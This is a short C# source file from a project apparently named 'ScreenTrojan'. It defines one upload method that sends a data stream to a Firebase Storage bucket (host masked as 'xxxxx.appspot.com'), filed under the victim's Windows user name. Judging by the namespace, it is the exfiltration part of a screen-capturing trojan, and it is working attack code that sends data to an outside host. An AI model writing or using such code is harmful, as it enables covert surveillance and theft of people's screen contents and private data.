using Firebase.Storage;
using System;


namespace ScreenTrojan
{
    
    public class Upload
    {
       

        public async void Upload_File(System.IO.Stream stream, String file_name)
        {
            var task = new FirebaseStorage("xxxxx.appspot.com")
                   .Child("data")
                   .Child(Environment.UserName)
                   .Child(file_name)
                   .PutAsync(stream);



            //task.Progress.ProgressChanged += (s, e) => MessageBox.Show($"Progress: {e.Percentage} %");


            var downloadUrl = await task;
        }
    }
}